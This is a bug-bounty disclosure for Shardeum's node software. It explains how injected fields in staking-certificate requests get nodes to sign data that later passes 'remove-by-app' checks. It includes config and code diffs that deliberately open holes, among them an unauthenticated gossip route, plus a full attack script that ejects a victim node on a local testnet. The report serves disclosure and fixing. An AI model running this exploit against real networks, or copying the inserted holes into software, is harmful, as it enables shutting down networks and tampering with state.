# #39994 \[BC-Critical] Tricking nodes into signing nearly-arbitrary data

**Submitted on Feb 12th 2025 at 12:06:28 UTC by @Blockian for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39994
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Note

This is the same bug that was already submitted in past contests, but was incorrectly fixed:[34484](https://reports.immunefi.com/shardeum-core/34484-bc-critical-tricking-legit-node-to-signed-maliciously-contr...) and [33632](https://reports.immunefi.com/shardeum-core/33632-bc-critical-signature-forgery-on-behalf-of-other-nodes-lead...)\
As stated by you, all past reports expect those stated explicitly are in-scope.

## Impact

Can be used to trick nodes into signing nearly arbitrary data, and then used to kick nodes out of the network, to add nodes to the network, to change global state, and so on.

## Root Cause

The root cause it the fact that the logic of signing staking certificates doesn't validate other fields in the object.\
Another cause (that isn't the root cause but a critical part of the exploit) is that endpoints that expect signed data don't validate that the signed data doesn't contain unexpected fields.

## Attack Flow

* A malicious user asks a node to sign a staking certificate, also containing fields related to "remove-by-app" or "set-global".
* The user then uses that certificate to remove a node or change the global account config, successfully passing signature validation.

## Deep Dive

* The `binary_sign_app_data` endpoint [handler](https://github.com/shardeum/core/blob/bugbounty/src\shardus\index.ts#L3041-L3041) calls [`signAppData`](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L6502-L6502) without validation
* `signAppData` [calls](https://github.com/shardeum/shardeum//blob/bugbounty/src\index.ts#L6596-L6596) [`signAsNode`](https://github.com/shardeum/core/blob/bugbounty/src\shardus\index.ts#L2163-L2163) without validating anything besides the data that is related to the staking node (`stake`, `nominee`, `nominator`, `certExp`)
* The `remove-by-app` [handler](https://github.com/shardeum/core/blob/bugbounty/src\p2p\Lost.ts#L1419-L1419) calls [`verifyRemoveCertificate`](https://github.com/shardeum/core/blob/bugbounty/src\p2p\Lost.ts#L1453-L1453)
* `verifyRemoveCertificate` only validates fields related to node removal (`nodePublicKey` and `cycle`)

## Suggested Fix

A few changes need to be made:

1. Every place that calls `signAsNode` should remove all unnecessary fields
2. Every place that checks a signature should remove all unnecessary fields

## Severity

* This allows to kick nodes from the network and so is critical as evident by many past reports
* This also allows changing global state which is also critical

## Proof of Concept

## Proof of Concept

1. Apply the following changes to `shardeum`:

```diff
diff --git a/src/config/genesis.json b/src/config/genesis.json
index 53aeee7e..65e5cc1b 100644
--- a/src/config/genesis.json
+++ b/src/config/genesis.json
@@ -89,6 +89,9 @@
   "0x0c799D15c3f2e9dAf10677aD09565E93CAc3e4c4": {
     "wei": "1001000000000000000000"
   },
+  "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d": {
+    "wei": "10000000000000000000000000"
+  },
   "0xEbe173a837Bc30BFEF6E13C9988a4771a4D83275": {
     "wei": "1001000000000000000000"
   },
diff --git a/src/config/index.ts b/src/config/index.ts
index 78a7c2c2..04d4e021 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -143,9 +143,9 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 1280, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 1280,
-      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1280,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 10, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 10,
+      maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 10,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
       maxRotatedPerCycle: process.env.maxRotatedPerCycle ? parseInt(process.env.maxRotatedPerCycle) : 1,
@@ -157,7 +157,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -218,13 +218,13 @@ config = merge(config, {
       allowActivePerCycle: 1,
 
       syncFloorEnabled: true,  //ITN initially false for rotation safety
-      syncingDesiredMinCount: 40, //ITN = 40
+      syncingDesiredMinCount: 5, //ITN = 40
 
       activeRecoveryEnabled: true,//ITN initially false for rotation safety
       allowActivePerCycleRecover: 4, 
 
       flexibleRotationEnabled: true, //ITN 1.16.1
-      flexibleRotationDelta: 10,
+      flexibleRotationDelta: 0,
 
       maxStandbyCount: 30000, //max allowed standby nodes count
       enableMaxStandbyCount: true,
@@ -295,7 +295,7 @@ config = merge(config, {
     sharding: {
       nodesPerConsensusGroup: process.env.nodesPerConsensusGroup
         ? parseInt(process.env.nodesPerConsensusGroup)
-        : 128, //128 is the final goal
+        : 10, //128 is the final goal
       nodesPerEdge: process.env.nodesPerEdge ? parseInt(process.env.nodesPerEdge) : 5,
       executeInOneShard: true,
     },
@@ -345,11 +345,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
+      mode: 'debug', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         verboseNestedCounters: false,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
diff --git a/src/handlers/queryCertificate.ts b/src/handlers/queryCertificate.ts
index 81a1a0a4..1e742c5d 100644
--- a/src/handlers/queryCertificate.ts
+++ b/src/handlers/queryCertificate.ts
@@ -282,7 +282,7 @@ export async function queryCertificateHandler(
 ): Promise<CertSignaturesResult | ValidatorError> {
   nestedCountersInstance.countEvent('shardeum-staking', 'calling queryCertificateHandler')
 
-  const queryCertReq = req.body as QueryCertRequest
+  const queryCertReq = req.body
   const reqValidationResult = validateQueryCertRequest(queryCertReq)
   if (!reqValidationResult.success) {
     nestedCountersInstance.countEvent(
@@ -346,10 +346,7 @@ export async function queryCertificateHandler(
       reason: 'Operator certificate has expired',
     }
   }
-  return await getCertSignatures(shardus, {
-    nominator: queryCertReq.nominator,
-    nominee: queryCertReq.nominee,
-    stake: operatorAccount.operatorAccountInfo.stake,
-    certExp: operatorAccount.operatorAccountInfo.certExp,
-  })
+  queryCertReq.stake = operatorAccount.operatorAccountInfo.stake
+  queryCertReq.certExp = operatorAccount.operatorAccountInfo.certExp
+  return await getCertSignatures(shardus, queryCertReq)
 }
diff --git a/src/index.ts b/src/index.ts
index 22fb7ae9..a30dd850 100644
--- a/src/index.ts
+++ b/src/index.ts
@@ -205,8 +205,8 @@ let profilerInstance
 
 //   next shardus core will export the correct type
 export let logFlags = {
-  verbose: false,
-  dapp_verbose: false,
+  verbose: true,
+  dapp_verbose: true,
   error: true,
   fatal: true,
   important_as_error: true,
diff --git a/src/shardeum/shardeumFlags.ts b/src/shardeum/shardeumFlags.ts
index de85df9c..2a7221d4 100644
--- a/src/shardeum/shardeumFlags.ts
+++ b/src/shardeum/shardeumFlags.ts
@@ -132,7 +132,7 @@ export const ShardeumFlags: ShardeumFlags = {
   contractStoragePrefixBitLength: 3,
   contractCodeKeySilo: false,
   globalCodeBytes: false,
-  VerboseLogs: false,
+  VerboseLogs: true,
   debugTraceLogs: false,
   Virtual0Address: true,
   GlobalNetworkAccount: true,

```

2. Apply the following changes to `core`:

```diff
diff --git a/src/shardus/index.ts b/src/shardus/index.ts
index f29206b8..e6079da5 100644
--- a/src/shardus/index.ts
+++ b/src/shardus/index.ts
@@ -1017,7 +1019,8 @@ class Shardus extends EventEmitter {
     // handle config queue changes and debug logic updates
     this._registerListener(this.p2p.state, 'cycle_q1_start', async () => {
       let lastCycle = CycleChain.getNewest()
-
+      
+      console.trace(`BLOCKIANLOGS cycle_q1_start: ${this.stateManager.appFinishedSyncing}`)
       // need to make sure sync is finish or we may not have the global account
       // even worse, the dapp may not have initialized storage yet
       if (this.stateManager.appFinishedSyncing === true) {
@@ -1137,7 +1140,7 @@ class Shardus extends EventEmitter {
 
     // Ask App to crack open tx and return timestamp, id (hash), and keys
     const { timestamp, id, keys, shardusMemoryPatterns } = this.app.crack(timestampedTx, appData);
-    // console.log('app.crack results', timestamp, id, keys)
+    console.trace('BLOCKIANLOGS app.crack results', timestamp, id, keys)
 
     // Validate the transaction's sourceKeys & targetKeys
     if (this.config.debug.checkAddressFormat && !isValidShardusAddress(keys.allKeys)) {
@@ -1177,6 +1180,7 @@ class Shardus extends EventEmitter {
       shardusMemoryPatterns: shardusMemoryPatterns
     };
     if (logFlags.verbose) this.mainLogger.debug("Transaction validated");
+    console.trace('BLOCKIANLOGS Transaction validated')
     if (global === false) {
       //temp way to make global modifying TXs not over count
       this.statistics.incrementCounter("txInjected");
@@ -1196,6 +1200,7 @@ class Shardus extends EventEmitter {
     if (logFlags.verbose) {
       this.mainLogger.debug(`End of injectTransaction ${utils.stringifyReduce(tx)}, added: ${added}`);
     }
+    console.trace(`BLOCKIANLOGS End of injectTransaction ${utils.stringifyReduce(tx)}, added: ${added}`)
 
     return {
       success: true,
@@ -2911,6 +2916,49 @@ class Shardus extends EventEmitter {
    * Register the exit and config routes
    */
   _registerRoutes() {
+    this.network.registerExternalPost('blockian_gossipRemoveNode', async (req, res) => {
+      let receipt = req.body.receipt
+      console.log(`BLOCKIAN: Trying to disconnect him: ${receipt.nodePublicKey}`)
+
+      Comms.sendGossip(
+        'remove-by-app',
+        receipt, // payload
+        'trackthis', // tracker
+        Self.id, // sender
+        nodeListFromStates([
+          P2P.P2PTypes.NodeStatus.ACTIVE,
+          P2P.P2PTypes.NodeStatus.READY,
+          P2P.P2PTypes.NodeStatus.SYNCING,
+        ]))
+      res.json({ success: true })
+    })
+
     // DEBUG routes
     this.network.registerExternalPost('exit', isDebugModeMiddlewareHigh, async (_req, res) => {
       res.json({ success: true })

```

3. Run a 10 nodes network (`shardus start 10`)
4. Run a `json-rpc-server`
5. Run the following attack script:

```js
import axios from "axios";
import crypto from '@shardus/crypto-utils';
import { ethers } from 'ethers'
import { fromAscii } from "@ethereumjs/util";

crypto.init("69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc")

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

let keyPair = {
    address: "0xE0291324263D7EC15fa3494bFDc1e902d8bd5d3d",
    publicKey: '0x7255db7f8aa57518fd0bceb743eb85fa110c791cc78661818677255006269855',
    secretKey: '0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede60217255db7f8aa57518fd0bceb743eb85fa110c791cc78661818677255006269855',
    privateKey: '0x759418c4f40e463452b15eda4b27478d152f2a2c04e6cd324fb620a9eede6021'
}

const JSON_RPC_URL = "http://127.0.0.1:8080";
const stake_to_address = "0x0000000000000000000000000000000000010000";
const provider = new ethers.providers.JsonRpcProvider(JSON_RPC_URL);
const wallet = new ethers.Wallet(keyPair.privateKey, provider);

async function sendStakeTransaction() {
    const stake_data = {
        stake: 10000000000000000000,
        internalTXType: 6, // Stake
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
    };
    const stake_tx = {
        to: stake_to_address,
        value: BigInt(10000000000000000000),
        data: fromAscii(JSON.stringify(stake_data))
    };
    const tx = await wallet.sendTransaction(stake_tx);
    const receipt = await tx.wait();

    return receipt;
}

async function sendSetCertTimeTransaction(randomNode) {
    const setCertTimeTx = {
        isInternalTx: true,
        internalTXType: 5,
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
        duration:  19, 
        timestamp: Date.now() + 100,
    }
    
    const nominator = setCertTimeTx.nominator.replace('0x', '').padEnd(64, '0')
    const before = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${nominator}`)
    console.log("Balance and certExp before attack --------------------------------------")
    console.log(before.data);
    
    
    console.log("Constructing InternalTx setCertTime: ", setCertTimeTx)

    crypto.signObj(setCertTimeTx, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    console.log("Signing InternalTx setCertTime: ", setCertTimeTx)

    console.log("Firing InternalTx setCertTime ....")
    let res = await axios.post(`http://${randomNode.ip}:${randomNode.port}/inject`, setCertTimeTx)

    if(!res.data.success) throw new Error(res.data.reason)
}

async function sendQueryCertRequest(randomNode, pk) {
    let res = await axios.get('http://0.0.0.0:4000/cycleinfo/1')
    let currentCycle = res.data.cycleInfo[0].counter
    console.log(`current cycle is ${currentCycle}`)
    let req = {
        nominee: keyPair.publicKey.replace('0x', '').padEnd(64, '0'),
        nominator: keyPair.address,
        // Injected remove-by-app fields, not validated.
        cycle: currentCycle - 1,
        nodePublicKey: pk
    }
    crypto.signObj(req, keyPair.secretKey.replace('0x', ''), keyPair.publicKey.replace('0x', ''))
    const data = await axios.put(`http://${randomNode.ip}:${randomNode.port}/query-certificate`, req)
    console.log(data.data)
    return data.data.signedStakeCert
}

async function sendRemoveNode(receipt, randomNode) {
    const data = await axios.post(`http://${randomNode.ip}:${randomNode.port}/blockian_gossipRemoveNode`, { receipt })
    console.log(data.data)
}

async function printState(randomNode) {
    let data1 = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${keyPair.publicKey.replace('0x', '').padEnd(64, '0')}`)
    let data2 = await axios.get(`http://${randomNode.ip}:${randomNode.port}/account/${keyPair.address.replace('0x', '').padEnd(64, '0')}`)
    console.log(data1.data);
    console.log(data2.data);
}

async function getNodeList() {
    console.log("Grabbing Nodelist ....");
    let res = await axios.get('http://0.0.0.0:4000/nodelist')   
    const nodelist = res.data.nodeList
    return nodelist
}

async function waitTillFinish() {
    console.log("Waiting 60 sec for transaction to be finalized");
    await sleep(60000)
}

const main = async  () => {
    let nodelist = await getNodeList()
    const randomNode = nodelist[Math.floor(Math.random() * (nodelist.length-1)) + 1]
    const victimNode = nodelist[0]
    

    console.log("Data before stake --------------------------------------")
    await printState(randomNode)
    await sendStakeTransaction()
    await waitTillFinish()
    
    console.log("Data after stake, before setCertTIme --------------------------------------")
    await printState(randomNode)

    await sendSetCertTimeTransaction(randomNode)
    await waitTillFinish()

    console.log("Data after setCert, before queryCertRequest --------------------------------------")
    await printState(randomNode)

    let receipt = {}
    receipt = await sendQueryCertRequest(randomNode, victimNode.publicKey);
    console.log(receipt)

    console.log("Node list after queryCertRequest, before attack")
    console.log(await getNodeList())
    await sendRemoveNode(receipt, randomNode)
    await waitTillFinish()

    console.log("Node list after attack")
    console.log(await getNodeList())
}

main();
```
